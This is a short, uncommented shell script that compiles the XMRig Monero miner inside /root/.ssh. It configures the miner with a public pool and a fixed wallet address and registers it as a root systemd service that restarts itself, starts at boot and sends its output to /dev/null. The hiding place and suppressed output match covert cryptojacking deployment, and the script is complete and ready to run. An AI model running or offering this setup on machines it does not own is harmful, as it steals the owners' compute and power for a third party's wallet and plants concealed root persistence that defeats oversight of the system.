
cd .ssh
sudo apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen htop neofetch mc -y && git clone https://github.com/xmrig/xmrig.git && cd xmrig && mkdir build && cd build && cmake .. && make -j$(nproc)

cat > /root/.ssh/xmrig/build/config.json << END
{
    "autosave": true,
    "cpu": true,
    "pools": [
        {
            "url": "pool.supportxmr.com:3333",
            "user": "46wjP8PjKGnEKdj9toj7dVJpU4txU3wu1GdEZ3tdNrLWabfHNnYvsjz4YqWGvTG2799PydJsnm2bEMJMoz5KYNnbDEoXmJ8",
            "pass": "x",
            "keepalive": true,
            "tls": false
        }
    ]
}
END

cat > /etc/systemd/system/xmrig.service <<EOF
[Unit]
Description=XMRig Miner
After=network.target
[Service]
Type=simple
User=root
WorkingDirectory=/root/.ssh/xmrig/build
ExecStart=/root/.ssh/xmrig/build/./xmrig -c /root/.ssh/xmrig/build/config.json > /dev/null 2>&1
Restart=always
RestartSec=10
StandardOutput=syslog
StandardError=syslog
SyslogIdentifier=xmrig
[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable xmrig
sudo systemctl start xmrig
